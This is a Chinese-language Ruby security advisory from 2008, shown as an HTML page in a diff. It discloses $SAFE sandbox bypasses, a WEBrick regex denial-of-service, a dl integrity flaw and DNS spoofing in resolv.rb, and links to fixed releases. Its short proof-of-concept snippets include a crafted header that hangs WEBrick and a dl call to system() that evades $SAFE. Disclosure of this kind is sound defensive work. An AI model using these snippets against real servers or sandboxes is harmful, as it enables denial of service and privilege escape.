@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+
+    
+    <title>Ruby中的多个安全漏洞 - Ruby 官方网站</title>
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta itemprop="image" content="https://www.ruby-lang.org/images/header-ruby-logo@2x.png">
+    
+    <meta name="description" content="">
+    
+
+    <link rel="stylesheet" type="text/css" href="/stylesheets/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/main.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygments.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/mobile.css">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css">
+    <link href='https://fonts.googleapis.com/css?family=Noto+Sans:400,700,400italic,700italic&amp;subset=latin,cyrillic,greek,vietnamese' rel='stylesheet' type='text/css'>
+    <link rel="canonical" href="https://www.ruby-lang.org/zh_cn/news/2008/08/08/multiple-vulnerabilities-in-ruby/">
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+    
+    <link href="/zh_cn/feeds/news.rss" rel="alternate" title="最新消息（RSS）" type="application/rss+xml">
+
+
+    <script type="text/javascript" src="/javascripts/jquery.min.js"></script>
+    <script type="text/javascript" src="/javascripts/page.js"></script>
+    
+  </head>
+
+  
+
+  <body>
+    <div id="header">
+      <div id="header_content" class="container">
+        <a href="/zh_cn/">
+          <h1>Ruby</h1>
+          <h2>程序员最好的朋友</h2>
+        </a>
+
+        <div class="site-links">
+          
+
+  <a href="/zh_cn/" class="home">首页</a>
+
+  <a href="/zh_cn/downloads/">下载</a>
+
+  <a href="/zh_cn/documentation/">文档</a>
+
+  <a href="/zh_cn/libraries/">代码库</a>
+
+  <a href="/zh_cn/community/">社区</a>
+
+  <a href="/zh_cn/news/">新闻</a>
+
+  <a href="/zh_cn/security/">安全</a>
+
+  <a href="/zh_cn/about/">关于 Ruby</a>
+
+
+          <a href="#" class="menu selected">Menu</a>
+        </div>
+
+        <div id="search-box">
+          
+<form id="search-form" action="https://www.google.com/cse">
+  <table class="fieldset">
+    <tr>
+      <td>
+        <input class="field" type="text" name="q" size="31" style="background: white url(//www.google.com/coop/intl/zh_cn/images/google_custom_search_watermark.gif) left no-repeat" onfocus="this.style.background='white'" onblur="if (/^\s*$/.test(this.value)) this.style.background='white url(//www.google.com/coop/intl/zh_cn/images/google_custom_search_watermark.gif) left no-repeat'"/>
+      </td>
+      <td>
+        
+        <input type="hidden" name="ie" value="UTF-8" />
+        <input class="button" type="submit" name="sa" value="搜索" />
+      </td>
+    </tr>
+  </table>
+</form>
+
+        </div>
+      </div>
+    </div>
+
+    <div id="page">
+      
+
+
+      <div id="main-wrapper" class="container">
+        <div id="main">
+          
+
+<div id="content-wrapper">
+  
+<h1>Ruby中的多个安全漏洞 - Ruby 官方网站</h1>
+
+
+
+  <div id="content">
+    <p class="post-info">由 Xpol Wan 发表于 2008-08-08</p>
+
+    <p>Ruby中发现多个安全漏洞。建议你更新到最新版本。</p>
+<h2>详情</h2>
+<p>发现以下安全漏洞。</p>
+<h3>在安全级别下的几个漏洞</h3>
+<p>发现在安全级别下存在几个漏洞。</p>
+<ul>
+<li>
+<p>在安全级别4下untrace_var被允许。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trace_var(:$VAR) {|val| puts "$VAR = #{val}" }
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   proc = untrace_var :$VAR
+   proc.first.call("aaa")
+ }
+end.join
+</code></pre></div></div>
+</li>
+<li>
+<p>在安全级别4下$PROGRAM_NAME可能被修改。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread.new do
+ $SAFE = 4
+ eval %q{$PROGRAM_NAME.replace "Hello, World!"}
+end.join
+
+$PROGRAM_NAME #=&gt; "Hello, World!"
+</code></pre></div></div>
+</li>
+<li>
+<p>在安全级别1-3下可能调用不安全的方法。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Hello
+ def world
+   Thread.new do
+     $SAFE = 4
+     msg = "Hello, World!"
+     def msg.size
+       self.replace self*10 # replace string
+       1 # return wrong size
+     end
+     msg
+   end.value
+ end
+end
+
+$SAFE = 1 # or 2, or 3
+s = Hello.new.world
+if s.kind_of?(String)
+ puts s if s.size &lt; 20 # print string which size is less than 20
+end
+</code></pre></div></div>
+</li>
+<li>
+<p>在安全级别4下Syslog操作被允许。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require "syslog"
+
+Syslog.open
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
+   Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
+   Syslog.info("masked")
+   Syslog.close
+ }
+end.join
+</code></pre></div></div>
+</li>
+</ul>
+<p>以上漏洞是由Keita Yamaguchi报告的。</p>
+<h3>WEBrick中的致拒绝服务(DoS)漏洞</h3>
+<p>WEBrick::HTTP::DefaultFileHandler存在消耗指数时间响应请求的错误，
+因为WEBrick::HTTPUtils.split_header_value中的一个回溯正则表达式 （backtracking
+regular expression）。</p>
+<p>可被利用的服务器：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'webrick'
+WEBrick::HTTPServer.new(:Port =&gt; 2000, :DocumentRoot =&gt; "/etc").start
+</code></pre></div></div>
+<p>攻击：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'net/http'
+res = Net::HTTP.start("localhost", 2000) { |http|
+  req = Net::HTTP::Get.new("/passwd")
+  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
+  http.request(req)
+}
+p res
+</code></pre></div></div>
+<p>在这个例子中这个请求很可能无法完成。</p>
+<p>这个漏洞是由Christian Neukirchen报告的。</p>
+<h3>dl中缺乏完整性检查</h3>
+<p>{: #label-3}</p>
+<p>dl没有进行完整性检查，因此可能允许攻击者调用危险的函数。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require 'dl'
+$SAFE = 1
+h = DL.dlopen(nil)
+sys = h.sym('system', 'IP')
+uname = 'uname -rs'.taint
+sys[uname]
+</code></pre></div></div>
+<p>这个漏洞是由sheepman报告的。</p>
+<h3>resolv.rb的欺骗DNS漏洞</h3>
+<p>resolv.rb允许远程攻击者欺骗DNS响应。这个漏洞可以通过随机的DNS事务ID和源端口来解决。
+所以resolv.rb已经采用随机化的方式来修正。</p>
+<ul>
+<li>参考： <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447">CVE-2008-1447</a></li>
+</ul>
+<p>这个漏洞是由Tanaka Akira报告的。</p>
+<h2>受影响的版本</h2>
+<p>1.8系列
+: * 1.8.5 和所有之前的版本</p>
+<ul>
+<li>1.8.6-p285 和所有之前的版本</li>
+<li>1.8.7-p70 和所有之前的版本</li>
+</ul>
+<p>1.9系列
+: * r18423 和所有之前的修订版本</p>
+<h2>解决办法</h2>
+<p>1.8系列
+: 请更新到1.8.6-p286或者1.8.7-p71。</p>
+<ul>
+<li>
+<p><a href="https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p286.tar.gz">&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p286.tar.gz&gt;</a></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(md5: 797ea136fe43e4286c9362ee4516674e,
+sha256: 1774de918b156c360843c1b68690f5f57532ee48ff079d4d05c51dace8d523ed,
+size: 4590373)
+</code></pre></div></div>
+</li>
+<li>
+<p><a href="https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p71.tar.gz">&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p71.tar.gz&gt;</a></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(md5: 721741d1e0785a0b6b9fb07d55184908,
+sha256: 30ec4298e9ac186a2fe1a94362919ba805538252b707f3aadae1938429269c1a,
+size: 4805478)
+</code></pre></div></div>
+</li>
+</ul>
+<p>1.9系列</p>
+<p>: 请通过Subversion取得最新版本。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ svn co https://svn.ruby-lang.org/repos/ruby/trunk ruby
+</code></pre></div></div>
+<p>请注意修正这个漏洞的软件包可能已经可以通过你的软件包管理软件更新了。</p>
+<h2>贡献者</h2>
+<p>感谢Keita Yamaguchi, Christian Neukirchen, sheepman, and Tanaka Akira为Ruby
+Security Team指出这个问题。</p>
+<h2>修订记录</h2>
+<ul>
+<li>2008-08-08 12:21 +09:00 fixed the revision number of ruby 1.9.</li>
+</ul>
+
+  </div>
+</div>
+<hr class="hidden-modern" />
+
+<div id="sidebar-wrapper">
+  <div id="sidebar">
+    <div class="navigation">
+      
+
+      <h3><strong>最新消息</strong></h3>
+
+      <ul class="menu">
+        
+        <li><a href="/zh_cn/news/2022/12/25/ruby-3-2-0-released/">Ruby 3.2.0 已发布</a></li>
+        
+        <li><a href="/zh_cn/news/2022/12/06/ruby-3-2-0-rc1-released/">Ruby 3.2.0 RC 1 已发布</a></li>
+        
+        <li><a href="/zh_cn/news/2022/11/24/ruby-3-1-3-released/">Ruby 3.1.3 已发布</a></li>
+        
+        <li><a href="/zh_cn/news/2022/11/24/ruby-3-0-5-released/">Ruby 3.0.5 已发布</a></li>
+        
+        <li><a href="/zh_cn/news/2022/11/24/ruby-2-7-7-released/">Ruby 2.7.7 已发布</a></li>
+        
+      </ul>
+    </div>
+
+    
+
+    <h3>订阅</h3>
+    <p><a href="/zh_cn/feeds/news.rss">最新消息（RSS）</a></p>
+  </div>
+</div>
+<hr class="hidden-modern" />
+
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <div id="footer">
+        <div class="site-links">
+          
+
+  <a href="/zh_cn/" class="home">首页</a>
+
+  <a href="/zh_cn/downloads/">下载</a>
+
+  <a href="/zh_cn/documentation/">文档</a>
+
+  <a href="/zh_cn/libraries/">代码库</a>
+
+  <a href="/zh_cn/community/">社区</a>
+
+  <a href="/zh_cn/news/">新闻</a>
+
+  <a href="/zh_cn/security/">安全</a>
+
+  <a href="/zh_cn/about/">关于 Ruby</a>
+
+
+        </div>
+
+        <p>
+
+  本站其他语言版本：
+
+<a href="/bg/">Български</a>,
+<a href="/de/">Deutsch</a>,
+<a href="/en/">English</a>,
+<a href="/es/">Español</a>,
+<a href="/fr/">Français</a>,
+<a href="/id/">Bahasa Indonesia</a>,
+<a href="/it/">Italiano</a>,
+<a href="/ja/">日本語</a>,
+<a href="/ko/">한국어</a>,
+<a href="/pl/">polski</a>,
+<a href="/pt/">Português</a>,
+<a href="/ru/">Русский</a>,
+<a href="/tr/">Türkçe</a>,
+<a href="/vi/">Tiếng Việt</a>,
+<a href="/zh_cn/">简体中文</a>,
+<a href="/zh_tw/">繁體中文</a>.
+</p>
+
+        
+  <p><a href="/zh_cn/about/website/">本站</a>由 Ruby 社区的成员共同维护。</p>
+
+
+      </div>
+    </div>
+  </body>
+</html>
